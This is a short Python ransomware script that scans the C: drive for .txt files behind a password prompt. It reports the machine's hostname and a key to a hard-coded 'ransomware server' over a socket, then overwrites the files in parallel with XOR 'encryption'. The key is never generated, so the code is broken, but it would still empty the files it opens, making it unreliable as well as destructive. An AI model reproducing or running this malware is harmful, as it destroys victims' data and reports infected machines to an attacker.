import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue


#Safegaurd password
safegaurd=input('Please Enter Safegaurding password: ')
if safegaurd != 'start1':
    print('Incorrectvdsvwg')
    quit()

#File exstensions to encrypt
encrypted_ext = ('.txt',)

# Grab all files from machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)


# Generate key
key = ''
encryption_level = 128 // 8
char_pool = 'abcdefghijkmnlopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?:;@!£$%'
char_pool_len = len(char_pool)

hostname = os.getenv('COMPUTERNAME')

# Connect to ransomware server.
ip_address = '192.168.0.53'
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))

# Encrypt files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
            print(f'Failed to encrypt file.')
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt,args=(key,), daemon=True, )
    thread.start()


q.join()
print('Encryption was successful')


    


